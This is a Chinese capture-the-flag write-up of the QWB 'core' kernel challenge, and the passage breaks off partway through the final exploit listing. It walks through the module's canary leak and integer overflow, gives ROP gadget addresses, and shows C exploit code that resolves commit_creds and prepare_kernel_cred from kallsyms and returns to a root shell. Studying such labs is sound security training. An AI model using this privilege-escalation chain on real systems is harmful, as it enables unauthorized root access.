<p>所以，我们的第一步是遍历<code>/tmp/kallsyms</code>文件找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>两个函数的地址，这一步很简单，会C语言的应该都没有问题。不过为了能够让代码看上去更加简洁，我们使用fscanf函数。该函数从某一个文件标识符中读取字符流并将其转换为我们设定的格式化字符串中的数据。在原理上和scanf函数相似，不过scanf是接受控制台输入的字符。值得注意的是，fscanf函数使用空格分割每一个参数。通过打印<code>/tmp/kallsyms</code>文件我们可以发现，该文件由很多行组成，每一行都有3个值，分别为地址、类型和函数名，中间以空格分开。因此我们可使用<code>fscanf(fd,&quot;%llx%s%s&quot;, ...)</code>来进行逐行读取。同时，充分利用其返回值。fscanf的返回值是成功读取参数的个数，因此当文件读取到末尾时，fscanf由于遇到了EOF，因此返回值为0。我们利用此返回值将fscanf语句写到while循环的条件中，就可以实现文件读取结束后自动退出循环。代码如下（这里的printf打印加入了颜色）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;	<span class="comment">// address of to key function</span></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">	FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);	<span class="comment">// including all address of kernel functions</span></span><br><span class="line">	<span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line">	<span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line">		<span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)		<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;		<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;	<span class="comment">// function &quot;prepare_kernel_cred&quot; found</span></span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好，现在我们成功获取了这两个函数的地址，那么是不是直接将其作为函数指针调用就行了呢？当然不是，这可是内核的函数，不是用户态程序随随便便就能够调用的。不过好在我们有自定义的LKM可以作为跳板使用。</p>
<p>所有的内核函数都需要通过类似于接口的东西来调用，用户态无法直接调用。使用open函数打开内核进程后通过ioctl函数可以与内核进行通信，内核通过用户的ioctl函数获取用户提供的数据并进行处理，整体上看是一个黑盒。在core.ko中，我们通过IDA反编译可知，在内核装载时就创建了一个名为core的进程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们在/proc文件夹中能够找到core这个文件，也就是由core.ko创建的内核进程。使用open函数获取到文件指针，将文件指针作为ioctl函数的参数之一即可指定与core进程进行交互。在core.ko中有core_ioctl函数记录了core这个进程提供的3个接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: %d\n&quot;</span>, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: called core_copy\n&quot;</span>);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的第二个参数是请求码，对不同的接口赋予一个编号，在传入数据时顺带传入以确认接入的接口是哪一个。这里看到有3个接口，分别实现不同的功能。我们要执行内核的函数，就必须在内核中下文章，思考如何在内核执行其原有功能时进行我们想要的操作：提权。</p>
<p>在内核ko文件中，我们需要重点关注data节中的file_operations结构体（定义如下）。其中是一系列指针，每一个都对应调用的函数。假如我们自己写一个内核ko模块，想要让它能够作为fd参数传入到read函数中，那么其中的file_operations的read就应该写上我们自己定义在该内核模块中的函数，用户层调用read函数也就相当于该内核模块中调用read函数指针指向的函数。如果这样的函数不存在，则此处填NULL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line">	<span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">	<span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">	<span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line">	<span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">	<span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">	<span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">			  <span class="type">loff_t</span> len);</span><br><span class="line">	<span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">			<span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">				   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">				   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line">	<span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>下面就是core.ko中的file_operations结构体，看到这里定义了write函数，而read函数在ioctl中传入指定的请求码后调用。因此我们可以直接使用write函数调用core模块中的core_write函数。<br />
<img src="https://img-blog.csdnimg.cn/84bf192ab9f8481aba5f0cf86dca16ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>在core_write中，我们可以将用户数据拷贝到内核中，存放在core模块中的name部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的copy_from_user函数就是拷贝函数，第一个参数为拷贝目的地址，在内核空间；第二个参数为拷贝源地址，在用户空间；第三个参数为拷贝字节数。name一共占0x800字节。</p>
<p>在core_read函数中，程序读取64个缓冲区的内容并将其返回给用户空间，其中开始读取的位置是我们可以改变的，这就能够泄露内核空间中该函数的canary。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *bufptr; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>, off, (<span class="type">const</span> <span class="type">void</span> *)a1);</span><br><span class="line">  bufptr = buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)bufptr = <span class="number">0</span>;</span><br><span class="line">    bufptr += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(a1, &amp;buf[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在core_copy_func函数中，有整形溢出，使得我们有构造ROP链的机会：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此，基本的步骤已经明确：<br />
Step 1: 使用core_read函数获取canary<br />
Step 2: 使用core_write函数写入ROP到name<br />
Step 3: 使用core_copy_func函数在栈上追加ROP</p>
<p>由于本内核模块启用了KASLR地址随机化保护机制，因此需要与计算出一个偏移量，题目中给出的vmlinux的commit_creds函数地址为FFFFFFFF8109C8E0（无地址随机化），相减即得偏移量。</p>
<p>为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值。这里引用开头参考资料的代码，这个函数应该首先被执行：（<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98">链接</a>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面只需要解决一个问题：如何构造内核空间的ROP链。</p>
<p>首先我们需要执行prepare_kernel_cred函数，传入rdi=0即可，返回值保存在rax之中。因此要想将rax传入到commit_creds函数中，我们还需要先将rax的值赋值给rdi。vmlinux为我们提供了充足的gadget，很容易就能够找到这些gadget的地址，将其记录在我们的exp中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrdirax_callrdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br></pre></td></tr></table></figure>
<p>这里没有找到mov rdi, rax; ret的gadget，因此使用call来代替，不过需要注意的是，call指令执行后，会将该指令下一条指令入栈。如果我们在call之后没有进行pop操作，则ret时执行的就不是我们想要的栈上的地址了。因此这里加上了一个pop rcx; ret的gadget，目的是将call指令入栈的地址pop出来以保证ret后继续执行ROP链后面的部分。</p>
<p>当<code>commit_creds(prepare_kernel_cred(NULL))</code>执行完毕时，我们还需要引导内核正确地退出到用户态，因此需要在后面加上swapgs和iretq指令，其中iretq指令后面需要依次跟上：返回地址、cs、rflags、sp、ss，后面的4个是我们在程序一开始就保存好的，直接接上即可，返回地址则填写执行<code>system(&quot;/bin/sh&quot;)</code>的地址。这样，从内核态返回后，我们就能够提升进程的权限了。</p>
<p>下面即为最终的exp，在exp中笔者加入了打印地址片段二进制值的函数<code>print_binary(char* buf, int length)</code>，便于查看指定地址的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;	<span class="comment">// address of to key function</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds_base = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrdirax_callrdx = <span 